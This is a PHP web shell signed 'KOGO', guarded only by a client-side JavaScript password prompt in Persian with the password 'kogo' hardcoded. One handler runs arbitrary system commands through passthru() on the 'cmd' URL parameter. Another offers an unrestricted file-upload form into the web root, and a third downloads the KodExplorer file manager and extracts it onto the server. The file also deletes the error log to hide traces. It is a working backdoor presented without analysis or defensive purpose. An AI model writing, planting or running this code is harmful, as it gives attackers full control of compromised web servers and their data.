<!DOCTYPE html>
<html>
<SCRIPT language="JavaScript">
<!--
var password;
var pass1="kogo";
password=prompt('لطفا پسورد را وارد کنید.','');
if (password==pass1){;}
else{window.location="http://google.com";}
//-->
</SCRIPT>
<?php
/**
 * Class Extractor
 *
 * Extract a archive (zip/gzip/rar) file.
 *
 *
 */
class Extractor {

    /**
     * Checks file extension and calls suitable extractor functions.
     *
     * @param $archive
     * @param $destination
     */
    public static function extract($archive, $destination){
        $ext = pathinfo($archive, PATHINFO_EXTENSION);
        switch ($ext){
            case 'zip':
                $res = self::extractZipArchive($archive, $destination);
                break;
            case 'gz':

                $res = self::extractGzipFile($archive, $destination);
                break;
            case 'rar':

                $res = self::extractRarArchive($archive, $destination);
                break;
        }

        return $res;
    }

    /**
     * Decompress/extract a zip archive using ZipArchive.
     *
     * @param $archive
     * @param $destination
     */
    public static function extractZipArchive($archive, $destination){
        // Check if webserver supports unzipping.
        if(!class_exists('ZipArchive')){
            $GLOBALS['status'] = array('error' => 'Your PHP version does not support unzip functionality.');
            return false;
        }

        $zip = new ZipArchive;

        // Check if archive is readable.
        if($zip->open($archive) === TRUE){
            // Check if destination is writable
            if(is_writeable($destination . '/')){
                $zip->extractTo($destination);
                $zip->close();
                $GLOBALS['status'] = array('success' => 'Files unzipped successfully');
                return true;
            }else{
                $GLOBALS['status'] = array('error' => 'Directory not writeable by webserver.');
                return false;
            }
        }else{
            $GLOBALS['status'] = array('error' => 'Cannot read .zip archive.');
            return false;
        }
    }

    /**
     * Decompress a .gz File.
     *
     * @param $archive
     * @param $destination
     */
    public static function extractGzipFile($archive, $destination){
        // Check if zlib is enabled
        if(!function_exists('gzopen')){
            $GLOBALS['status'] = array('error' => 'Error: Your PHP has no zlib support enabled.');
            return false;
        }

        $filename = pathinfo($archive, PATHINFO_FILENAME);
        $gzipped = gzopen($archive, "rb");

        $file = fopen($filename, "w");

        while ($string = gzread($gzipped, 4096)) {
            fwrite($file, $string, strlen($string));
        }
        gzclose($gzipped);

        fclose($file);

        // Check if file was extracted.
        if(file_exists($destination.'/'.$filename)){
            $GLOBALS['status'] = array('success' => 'File unzipped successfully.');
            return true;
        }else{
            $GLOBALS['status'] = array('error' => 'Error unzipping file.');
            return false;
        }
    }

    /**
     * Decompress/extract a Rar archive using RarArchive.
     *
     * @param $archive
     * @param $destination

     */
    public static function extractRarArchive($archive, $destination){
        // Check if webserver supports unzipping.
        if(!class_exists('RarArchive')){
            $GLOBALS['status'] = array('error' => 'Your PHP version does not support .rar archive functionality.');
            return false;
        }
        // Check if archive is readable.
        if($rar = RarArchive::open($archive)){

            // Check if destination is writable
            if (is_writeable($destination . '/')) {
                $entries = $rar->getEntries();
                foreach ($entries as $entry) {
                    $entry->extract($destination);
                }
                $rar->close();
                $GLOBALS['status'] = array('success' => 'File extracted successfully.');
                return true;
            }else{
                $GLOBALS['status'] = array('error' => 'Directory not writeable by webserver.');
                return false;
            }
        }else{
            $GLOBALS['status'] = array('error' => 'Cannot read .rar archive.');
            return false;
        }
    }

}

?>
-
war - /front/js/pages/kogo/kogozip
<?php
//Code By KOGO
if($_GET['cmd'] == 'war'){
echo "<span style='font-size:20px;color:red'>File Can't Be Create</span>";
}
//Code By KOGO
?>
-
zip
<?php
//Code By KOGO
if($_GET['cmd'] == 'zip'){

$extractor = new Extractor;

// Path of archive file
$archivePath = './kogo.zip';

// Destination path
$destPath = './';

// Extract archive file
$extract = $extractor->extract($archivePath, $destPath);

if($extract){
    echo $GLOBALS['status']['success'];
}else{
    echo $GLOBALS['status']['error'];
}
}
//Code By KOGO
?>
-
kod --KodExplorer-master--
<?php
//Code By KOGO
if($_GET['cmd'] == 'kod'){
if(file_put_contents("kogo.zip", file_get_contents("https://codeload.github.com/kalcaddle/KodExplorer/zip/refs/heads/master"))){
echo "<span style='font-size:20px;color:green'>OK</span>";
} else {
echo "<span style='font-size:20px;color:red'>File Can't Be Create</span>";
}
}
//Code By KOGO
?>
-
up

<?php
if ($_GET['cmd']=='up')
{
$docr = $_SERVER["DOCUMENT_ROOT"];
echo <<<HTML
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td><font size="1">Your File : </font> </td>
<td>
<input size="48" name="file" type="file" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
</tr>
<tr>
<td><font size="1">Upload Dir : </font> </td>
<td>
<input size="48" value="$docr/" name="path" type="text" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000">
<input type="submit" value="Upload  " style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
$tend
</table>
HTML;

if (isset($_POST["path"])){

$uploadfile = $_POST["path"].$_FILES["file"]["name"];
if ($_POST["path"]==""){$uploadfile = $_FILES["file"]["name"];}

if (copy($_FILES["file"]["tmp_name"], $uploadfile)) {
    echo "File uploaded to : $uploadfile\n";
    echo "- Size : " .$_FILES["file"]["size"]. "\n";

} else {
    print "Error  Upload File :\n";
}
}
}
?>

<?php
if(!empty($_GET['cmd'])){
        echo'<pre>';
        passthru($_GET['cmd']);
        echo'</pre>';
        exit;
}

unlink("error_log");
?>

</html>
